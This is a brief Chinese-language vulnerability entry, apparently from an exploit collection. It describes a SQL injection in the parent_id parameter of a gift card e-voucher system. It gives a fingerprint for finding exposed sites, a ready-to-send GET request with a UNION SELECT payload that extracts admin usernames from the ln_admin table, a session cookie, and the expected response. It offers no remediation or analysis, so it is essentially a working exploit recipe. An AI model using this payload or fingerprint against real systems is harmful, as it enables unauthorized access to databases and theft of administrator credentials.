# 礼品卡电子券收卡系统parent_id1存在前台存在SQL注入漏洞

- **系统**：礼品卡电子券收卡系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/Application/Home/Static/css/style2.css"`
- **请求**：`GET  /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,user_name,4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1`
- **关键头**：`Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4`
- **预期**：200　|　—